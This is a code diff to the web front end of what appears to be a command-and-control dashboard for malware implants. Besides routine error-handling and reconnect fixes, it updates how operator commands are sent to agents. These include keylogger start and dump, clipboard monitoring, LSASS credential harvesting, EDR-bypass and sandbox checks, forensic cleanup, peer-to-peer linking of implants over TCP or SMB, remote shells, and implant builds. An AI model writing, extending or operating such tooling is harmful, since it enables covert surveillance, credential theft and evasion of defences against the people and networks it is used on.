@@ -6,6 +6,8 @@
   const DASHBOARD_WS_PROTOCOL = "orchestra.dashboard.v1";
   let token = sessionStorage.getItem("oc_token") || "";
   let ws = null;
+  let wsReconnectTimer = null;
+  let refreshAgentsTimer = null;
 
   const headers = () => ({
     "Authorization": "Bearer " + token,
@@ -19,6 +21,39 @@
     });
     if (res.status === 401) throw new Error("unauthorized");
     return res;
+  }
+
+  function responseMessage(res, body) {
+    let detail = "";
+    if (body && typeof body === "object") {
+      detail = body.error || body.message || JSON.stringify(body);
+    } else if (body) {
+      detail = String(body).trim();
+    }
+    if (!detail && res.status === 429) {
+      detail = "too many requests; wait a moment and try again";
+    }
+    if (!detail) detail = res.statusText || "request failed";
+    return "HTTP " + res.status + ": " + detail;
+  }
+
+  async function readJson(res, label) {
+    const text = await res.text();
+    const trimmed = text.trim();
+    let body = null;
+
+    if (trimmed) {
+      try {
+        body = JSON.parse(trimmed);
+      } catch (e) {
+        if (!res.ok) throw new Error(responseMessage(res, trimmed));
+        throw new Error(label + " returned invalid JSON: " + e.message);
+      }
+    }
+
+    if (!res.ok) throw new Error(responseMessage(res, body || trimmed));
+    if (body === null) throw new Error(label + " returned an empty response.");
+    return body;
   }
 
   // ── Login ─────────────────────────────────────────────────────────
@@ -149,7 +184,7 @@
   async function refreshAgents() {
     try {
       const res = await api("/agents");
-      const agents = await res.json();
+      const agents = await readJson(res, "Agent list");
       renderAgents(agents);
     } catch (e) {
       console.warn(e);
@@ -157,7 +192,21 @@
   }
 
   // ── WebSocket ─────────────────────────────────────────────────────
+  function scheduleWsReconnect() {
+    if (wsReconnectTimer) return;
+    wsReconnectTimer = setTimeout(() => {
+      wsReconnectTimer = null;
+      openWs();
+    }, 5000);
+  }
+
+  function startAgentRefresh() {
+    if (refreshAgentsTimer) return;
+    refreshAgentsTimer = setInterval(refreshAgents, 15000);
+  }
+
   function openWs() {
+    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
     const proto = location.protocol === "https:" ? "wss:" : "ws:";
     // Browsers don't allow custom headers on WebSocket, so we pass the token
     // via the Sec-WebSocket-Protocol handshake header while negotiating a
@@ -166,6 +215,12 @@
     // upgrade; an unknown or missing token causes a 401 response.
     try {
       ws = new WebSocket(proto + "//" + location.host + "/api/ws", [DASHBOARD_WS_PROTOCOL, "bearer." + token]);
+      ws.onopen = () => {
+        if (wsReconnectTimer) {
+          clearTimeout(wsReconnectTimer);
+          wsReconnectTimer = null;
+        }
+      };
       ws.onmessage = (ev) => {
         try {
           const m = JSON.parse(ev.data);
@@ -173,11 +228,14 @@
           if (m.kind === "audit") appendAudit(m.event);
         } catch {}
       };
-      ws.onclose = () => setTimeout(openWs, 5000);
+      ws.onclose = () => { ws = null; scheduleWsReconnect(); };
+      ws.onerror = () => { try { ws.close(); } catch (_) {} };
     } catch (e) {
       console.warn("ws open failed", e);
+      ws = null;
+      scheduleWsReconnect();
     }
-    setInterval(refreshAgents, 5000);
+    startAgentRefresh();
   }
 
   function appendAudit(ev) {
@@ -305,10 +363,10 @@
       case "SandboxCheck": return "SandboxCheck";
       case "EdrBypassStatus": return "EdrBypassStatus";
       case "MorphNow": return { MorphNow: { seed: parseInt(args.seed, 10) || 0 } };
-      case "KeyloggerDump": return "KeyloggerDump";
+      case "KeyloggerDump": return { KeyloggerDump: { clear: false } };
       case "KeyloggerStop": return "KeyloggerStop";
       case "ClipboardGet": return "ClipboardGet";
-      case "ClipboardMonitorDump": return "ClipboardMonitorDump";
+      case "ClipboardMonitorDump": return { ClipboardMonitorDump: { clear: false } };
       case "ClipboardMonitorStop": return "ClipboardMonitorStop";
       case "ListTopology": return "ListTopology";
       case "ListLinks": return "ListLinks";
@@ -346,7 +404,8 @@
       case "Screenshot": return { Screenshot: { monitor: parseInt(args.monitor, 10) || 0 } };
 
       // ── Keylogger ──
-      case "KeyloggerStart": return { KeyloggerStart: { interval_ms: parseInt(args.interval_ms, 10) || 1000 } };
+      // KeyloggerStart is a zero-arg unit variant in the Rust Command enum.
+      case "KeyloggerStart": return "KeyloggerStart";
 
       // ── Clipboard Monitor ──
       case "ClipboardMonitorStart": return { ClipboardMonitorStart: { interval_ms: parseInt(args.interval_ms, 10) || 2000 } };
@@ -390,15 +449,15 @@
       case "SyscallEmulationToggle": return { SyscallEmulationToggle: { enabled: args.enabled === "true" } };
 
       // ── P2P Mesh ──
-      case "LinkAgents": return { LinkAgents: { agent_a: args.agent_a, agent_b: args.agent_b } };
+      case "LinkAgents": return { LinkAgents: { parent_agent_id: args.agent_a, child_agent_id: args.agent_b, transport: args.transport || "tcp", target_addr: args.target_addr || "" } };
       case "UnlinkAgent": return { UnlinkAgent: { agent_id: args.agent_id } };
-      case "LinkTo": return { LinkTo: { parent: args.parent } };
-      case "Unlink": return "Unlink";
-      case "MeshConnect": return { MeshConnect: { peer: args.peer } };
-      case "MeshDisconnect": return { MeshDisconnect: { peer: args.peer } };
+      case "LinkTo": return { LinkTo: { parent_addr: args.parent, transport: args.transport || "tcp" } };
+      case "Unlink": return { Unlink: { link_id: null } };
+      case "MeshConnect": return { MeshConnect: { target_agent_id: args.target_agent_id, transport: args.transport || "tcp", target_addr: args.target_addr } };
+      case "MeshDisconnect": return { MeshDisconnect: { target_agent_id: args.target_agent_id } };
       case "MeshKillSwitch": return "MeshKillSwitch";
-      case "MeshQuarantine": return { MeshQuarantine: { peer: args.peer } };
-      case "MeshClearQuarantine": return { MeshClearQuarantine: { peer: args.peer } };
+      case "MeshQuarantine": return { MeshQuarantine: { target_agent_id: args.target_agent_id, reason: parseInt(args.reason, 10) || 0 } };
+      case "MeshClearQuarantine": return { MeshClearQuarantine: { target_agent_id: args.target_agent_id } };
       case "MeshSetCompartment": return { MeshSetCompartment: { compartment: args.compartment } };
 
       // ── Forensic Cleanup ──
@@ -456,8 +515,8 @@
 
     // ── Surveillance ──
     Screenshot: [{ id: "monitor", label: "Monitor Index (0 = primary)", placeholder: "0" }],
-    KeyloggerStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "1000" }],
-    ClipboardMonitorStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "2000" }],
+    // KeyloggerStart is a zero-arg command — no modal needed.
+    ClipboardMonitorStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "1000" }],
 
     // ── Network Discovery ──
     NetPingSweep: [
@@ -567,15 +626,27 @@
 
     // ── P2P Mesh ──
     LinkAgents: [
-      { id: "agent_a", label: "Agent A ID", placeholder: "uuid-a" },
-      { id: "agent_b", label: "Agent B ID", placeholder: "uuid-b" },
+      { id: "agent_a", label: "Parent Agent ID", placeholder: "uuid-a" },
+      { id: "agent_b", label: "Child Agent ID", placeholder: "uuid-b" },
+      { id: "transport", label: "Transport (tcp / smb)", placeholder: "tcp" },
+      { id: "target_addr", label: "Target Address (host:port, for TCP)", placeholder: "10.0.0.2:9001" },
     ],
     UnlinkAgent: [{ id: "agent_id", label: "Agent ID to unlink", placeholder: "uuid" }],
-    LinkTo: [{ id: "parent", label: "Parent agent ID or address", placeholder: "uuid-or-host:port" }],
-    MeshConnect: [{ id: "peer", label: "Peer address", placeholder: "10.0.0.2:9001" }],
-    MeshDisconnect: [{ id: "peer", label: "Peer address", placeholder: "10.0.0.2:9001" }],
-    MeshQuarantine: [{ id: "peer", label: "Peer ID", placeholder: "uuid" }],
-    MeshClearQuarantine: [{ id: "peer", label: "Peer ID", placeholder: "uuid" }],
+    LinkTo: [
+      { id: "parent", label: "Parent address or agent ID", placeholder: "10.0.0.1:9001" },
+      { id: "transport", label: "Transport (tcp / smb)", placeholder: "tcp" },
+    ],
+    MeshConnect: [
+      { id: "target_agent_id", label: "Target Agent ID", placeholder: "uuid" },
+      { id: "transport", label: "Transport (tcp / smb)", placeholder: "tcp" },
+      { id: "target_addr", label: "Target Address (host:port)", placeholder: "10.0.0.2:9001" },
+    ],
+    MeshDisconnect: [{ id: "target_agent_id", label: "Target Agent ID", placeholder: "uuid" }],
+    MeshQuarantine: [
+      { id: "target_agent_id", label: "Target Agent ID", placeholder: "uuid" },
+      { id: "reason", label: "Reason code (0 = operator)", placeholder: "0" },
+    ],
+    MeshClearQuarantine: [{ id: "target_agent_id", label: "Target Agent ID", placeholder: "uuid" }],
     MeshSetCompartment: [{ id: "compartment", label: "Compartment name", placeholder: "red-team" }],
 
     // ── Forensic Cleanup ──
@@ -602,8 +673,8 @@
     "EvasionTransformScan", "EvasionTransformRun", "CetStatus",
     "RevertToken", "ListTokens", "DisablePrefetch", "RestorePrefetch",
     "SyncTimestamps", "SandboxCheck", "EdrBypassStatus",
-    "NetArpScan", "KeyloggerDump", "KeyloggerStop",
-    "ClipboardGet", "ClipboardMonitorDump", "ClipboardMonitorStop",
+    "NetArpScan", "KeyloggerStart", "KeyloggerStop",
+    "ClipboardGet", "ClipboardMonitorStop",
     "ListTopology", "ListLinks", "Unlink", "MeshKillSwitch",
     "HarvestLSASS",
   ]);
@@ -645,7 +716,7 @@
         method: "POST",
         body: JSON.stringify({ command }),
       });
-      const body = await res.json();
+      const body = await readJson(res, cmdName + " command");
       const cls = body.outcome === "ok" ? "ok" : "err";
       $("result").className = cls;
 
@@ -721,17 +792,18 @@
     if (term) { term.dispose(); }
     term = new Terminal({
       theme: {
-        background: "#0d1117",
-        foreground: "#e6edf3",
-        cursor: "#58a6ff",
-        selectionBackground: "#264f78",
-        black: "#0d1117", red: "#f85149", green: "#3fb950", yellow: "#d29922",
-        blue: "#58a6ff", magenta: "#bc8cff", cyan: "#39c5cf", white: "#e6edf3",
-        brightBlack: "#8b949e", brightRed: "#ff7b72", brightGreen: "#56d364",
-        brightYellow: "#e3b341", brightBlue: "#79c0ff", brightMagenta: "#d2a8ff",
-        brightCyan: "#56d4dd", brightWhite: "#f0f6fc",
+        background: "#0f0f0f",
+        foreground: "#f0f0f0",
+        cursor: "#ffffff",
+        selectionBackground: "rgba(255,255,255,.12)",
+        selectionForeground: "#ffffff",
+        black: "#0f0f0f", red: "#f87171", green: "#4ade80", yellow: "#fbbf24",
+        blue: "#60a5fa", magenta: "#c084fc", cyan: "#22d3ee", white: "#f0f0f0",
+        brightBlack: "#777", brightRed: "#fca5a5", brightGreen: "#86efac",
+        brightYellow: "#fde68a", brightBlue: "#93c5fd", brightMagenta: "#d8b4fe",
+        brightCyan: "#67e8f9", brightWhite: "#ffffff",
       },
-      fontFamily: '"Cascadia Code", "Fira Code", "SF Mono", Consolas, "Courier New", monospace',
+      fontFamily: '"JetBrains Mono", "Cascadia Code", "Fira Code", "SF Mono", Consolas, monospace',
       fontSize: 14,
       cursorBlink: true,
       scrollback: 2000,
@@ -756,11 +828,7 @@
         method: "POST",
         body: "{}",
       });
-      if (!res.ok) {
-        const txt = await res.text();
-        throw new Error(txt || res.statusText);
-      }
-      const { session_id } = await res.json();
+      const { session_id } = await readJson(res, "Shell open");
       shellAgentId = agentId;
       shellSessionId = session_id;
 
@@ -801,7 +869,7 @@
         "/shell/" + encodeURIComponent(shellSessionId) + "/output"
       );
       if (!res.ok) return;
-      const { data } = await res.json();
+      const { data } = await readJson(res, "Shell output");
       if (data && term) {
         try {
           // data is base64-encoded bytes from the agent
@@ -818,10 +886,11 @@
     if (shellPollTimer) { clearInterval(shellPollTimer); shellPollTimer = null; }
     if (shellAgentId && shellSessionId) {
       try {
-        await api("/agents/" + encodeURIComponent(shellAgentId) + "/command", {
-          method: "POST",
-          body: JSON.stringify({ command: { CloseShell: { session_id: shellSessionId } } }),
-        });
+        await api(
+          "/agents/" + encodeURIComponent(shellAgentId) +
+          "/shell/" + encodeURIComponent(shellSessionId) + "/close",
+          { method: "POST" }
+        );
       } catch (_) {}
     }
     shellAgentId = null;
@@ -839,7 +908,9 @@
   $("btn-gen-key").addEventListener("click", () => {
     const bytes = new Uint8Array(32);
     crypto.getRandomValues(bytes);
-    $("build-key").value = Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
+    let binary = "";
+    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+    $("build-key").value = btoa(binary);
   });
 
   /**
@@ -1077,7 +1148,7 @@
         body: JSON.stringify(req),
       });
 
-      const resData = await res.json();
+      const resData = await readJson(res, "Build request");
 
       if (!res.ok) {
         logEl.textContent += "Error: " + (resData.error || res.statusText);
@@ -1102,10 +1173,10 @@
       try {
         const res = await api("/info/fingerprint");
         if (res.ok) {
-          const data = await res.json();
+          const data = await readJson(res, "Server fingerprint");
           $("build-pin").value = data.fingerprint || data.sha256 || "";
         } else {
-          alert("Failed to fetch fingerprint: " + res.statusText);
+          alert("Failed to fetch fingerprint: " + responseMessage(res, await res.text()));
         }
       } catch (e) {
         alert("Fetch failed: " + e.message);
@@ -1120,6 +1191,9 @@
       if ($("audit-count")) $("audit-count").textContent = "0 entries";
     });
   }
+
+  $("login-btn").addEventListener("click", login);
+  $("token").addEventListener("keydown", (e) => { if (e.key === "Enter") login(); });
 
   if (token) {
     $("token").value = token;
@@ -1291,16 +1365,28 @@
 window.checkBuildStatus = async function(job_id) {
   const logEl = document.getElementById("build-log");
   const tok = sessionStorage.getItem("oc_token") || "";
+  const readJson = async (res, label) => {
+    const text = await res.text();
+    const trimmed = text.trim();
+    if (!res.ok) {
+      let detail = trimmed || res.statusText || "request failed";
+      if (trimmed) {
+        try {
+          const body = JSON.parse(trimmed);
+          detail = body.error || body.message || JSON.stringify(body);
+        } catch (_) {}
+      }
+      if (!trimmed && res.status === 429) detail = "too many requests; wait a moment and try again";
+      throw new Error("HTTP " + res.status + ": " + detail);
+    }
+    if (!trimmed) throw new Error(label + " returned an empty response.");
+    return JSON.parse(trimmed);
+  };
   try {
     const res = await fetch("/api/build/status/" + job_id, {
       headers: { "Authorization": "Bearer " + tok, "Content-Type": "application/json" },
     });
-    if (!res.ok) {
-      logEl.textContent += "\nError fetching status: " + res.statusText;
-      document.getElementById("btn-build").disabled = false;
-      return;
-    }
-    const data = await res.json();
+    const data = await readJson(res, "Build status");
     const currentLog = data.log || "";
     if (currentLog) {
       logEl.textContent = "Job ID: " + job_id + "\n" + currentLog;
